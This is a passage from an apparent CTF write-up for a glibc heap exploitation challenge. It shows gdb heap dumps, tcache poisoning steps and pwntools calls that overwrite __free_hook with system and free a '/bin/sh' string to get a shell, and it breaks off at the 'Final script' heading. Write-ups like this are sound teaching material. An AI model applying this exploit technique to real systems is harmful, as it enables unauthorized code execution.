</span></span><span style="display:flex;"><span>0x55802d04d3c0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3e0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3f0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d400	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d410	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d420	0x0000000000000000	0x0000000000000061
</span></span><span style="display:flex;"><span>0x55802d04d430	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x60][1/2]
</span></span><span style="display:flex;"><span>0x55802d04d440	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d450	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d460	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d470	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d480	0x0000000000000000	0x0000000000000061
</span></span><span style="display:flex;"><span>0x55802d04d490	0x000055802d04d430	0x000055802d04d010	 &lt;-- tcachebins[0x60][0/2]
</span></span><span style="display:flex;"><span>0x55802d04d4a0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4b0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4c0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4e0	0x0000000000000000	0x0000000000000071
</span></span><span style="display:flex;"><span>0x55802d04d4f0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x70][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d500	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d510	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d520	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d530	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d540	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d550	0x0000000000000000	0x0000000000000261	 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x55802d04d560	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x55802d04d7b0	0x0000000000000260	0x0000000000000030
</span></span><span style="display:flex;"><span>0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that our <code>comment</code> will determine the next tcache[0x60] pointer. Current bins:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>0x60 [  2]: 0x55802d04d490 ‚Äî‚ñ∏ 0x55802d04d430 ‚óÇ‚Äî 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s time to forge the tcache[0x60] linked list</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x20</span>, p64(free_hook), <span style="color:#069;font-weight:bold">True</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we do here is create a new property without comment, and then overwrite the value with the <code>__free_hook</code> address. Assign smaller size than the stored size of comment (0x49) to make sure that the <code>edit_property</code> directly edit the <code>comment</code> value. Now, the bins will be like below:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>0x60 [  2]: 0x55802d04d490 ‚Äî‚ñ∏ 0x7fe1975c1e48 (__free_hook) ‚óÇ‚Äî 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Current heap:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span style="display:flex;"><span>0x55802d04d320	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span style="display:flex;"><span>0x55802d04d340	0x000055802d04d7c0	0x0000000000000020
</span></span><span style="display:flex;"><span>0x55802d04d350	0x000055802d04d490	0x0000000000000020
</span></span><span style="display:flex;"><span>0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span style="display:flex;"><span>0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d380	0x0000000000000000	0x00000000000000a1
</span></span><span style="display:flex;"><span>0x55802d04d390	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0xa0][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d3a0	0x000055802d04d380	0x000055802d04d380
</span></span><span style="display:flex;"><span>0x55802d04d3b0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3c0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3e0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3f0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d400	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d410	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d420	0x0000000000000000	0x0000000000000061
</span></span><span style="display:flex;"><span>0x55802d04d430	0x0000000000000000	0x000055802d04d010
</span></span><span style="display:flex;"><span>0x55802d04d440	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d450	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d460	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d470	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d480	0x0000000000000000	0x0000000000000061
</span></span><span style="display:flex;"><span>0x55802d04d490	0x00007fe1975c1e48	0x000055802d04000a	 &lt;-- tcachebins[0x60][0/2]
</span></span><span style="display:flex;"><span>0x55802d04d4a0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4b0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4c0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d4e0	0x0000000000000000	0x0000000000000071
</span></span><span style="display:flex;"><span>0x55802d04d4f0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x70][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d500	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d510	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d520	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d530	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d540	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d550	0x0000000000000000	0x0000000000000261	 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x55802d04d560	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x55802d04d7b0	0x0000000000000260	0x0000000000000030
</span></span><span style="display:flex;"><span>0x55802d04d7c0	0x000000006f616d6c	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next step would be we need to consecutively alloc 0x60 chunks. Okay, so now, let&rsquo;s call <code>edit_property</code> to change the street name.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>edit_property(r, 0x49, b&#39;a&#39;*0x8, 0)
</span></span></code></pre></td></tr></table>
</div>
</div><p>By doing that, now the bins will be like below:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>0x60 [  1]: 0x7fe1975c1e48 (__free_hook) ‚óÇ‚Äî 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Also now, <code>street</code> and <code>comment</code> point to the same address (Because <code>comment</code> is a freed chunk, and during <code>street</code> call malloc, the <code>comment</code> chunk is used).</p>
<p>We are very close to solve this problem. Now, we need to do another malloc to be able overwrite the <code>__free_hook</code>. But unfortunately, both of the <code>street</code> and <code>comment</code> object size is already 0x60, and we can&rsquo;t malloc them without freeing the 0x60 chunk.
Here where <code>username</code> will take part. Remember that <code>change_username</code> is able to forge chunks located between <code>username</code> and <code>username+0x427</code>. And the <code>street</code> &amp; <code>comment</code> chunk (<code>0x000055802d04d490</code>) is located on there.
What we&rsquo;re going to do now is with <code>change_username</code>, forge the <code>0x000055802d04d490</code> chunk&rsquo;s size metadata to <code>0x51</code>, and then we&rsquo;re going to edit it to <code>0x61</code> with value the <code>system</code> address, so that we will:</p>
<ul>
<li>Free the forged chunk and put it inside 0x51 tcachebins instead of 0x61</li>
<li>Allocate 0x60 chunk (which mean <code>street</code>/<code>comment</code> will points to <code>__free_hook</code> now)</li>
<li>Allocated the <code>system</code> address to the <code>__free_hook</code> via <code>edit_property</code> by editing the <code>street</code>/<code>comment</code></li>
</ul>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>change_username(r, <span style="color:#f60">500</span>, p64(<span style="color:#f60">0</span>)<span style="color:#555">*</span><span style="color:#f60">31</span> <span style="color:#555">+</span> p64(<span style="color:#f60">0x51</span>)) <span style="color:#09f;font-style:italic"># Forge metadata of the chunk&#39;s size to 0x51</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x8</span>, <span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic"># Reset the stored size value first</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x49</span>, p64(system), <span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic"># Instead of freeing the 0x60 chunk, it will free the 0x51 and malloc 0x60 chunk</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the above code, we&rsquo;re finally overwrite the <code>__free_hook</code> with <code>system</code>. Now, we just need to change the <code>street</code> value to <code>/bin/sh\x00</code> and <code>free</code> it üòÑ</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, p64(system), <span style="color:#f60">13</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;/bin/sh</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>, <span style="color:#069;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, p64(system), <span style="color:#f60">0x90</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>, <span style="color:#069;font-weight:bold">True</span>, <span style="color:#069;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally, we got the shell!
<p class="markdown-image">
  <img src="https://i.imgur.com/GhRc2WN.jpg" alt=""  />
</p></p>
<h3 id="final-script">Final script <a href="#final-script" class="anchor">#</a></h3>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
